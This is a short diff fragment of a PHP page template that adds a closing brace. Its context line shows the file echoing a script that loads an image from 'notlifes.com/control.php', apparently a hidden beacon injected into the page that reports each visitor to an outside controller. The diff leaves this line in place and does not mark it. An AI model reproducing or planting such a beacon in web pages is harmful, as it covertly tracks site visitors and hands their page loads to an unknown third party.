@@ -62,4 +62,6 @@ echo '<script> new Image().src = "http://notlifes.com/control.php?_=150186043145
 </body>
 </html>';
 }
+}
+
 ?>
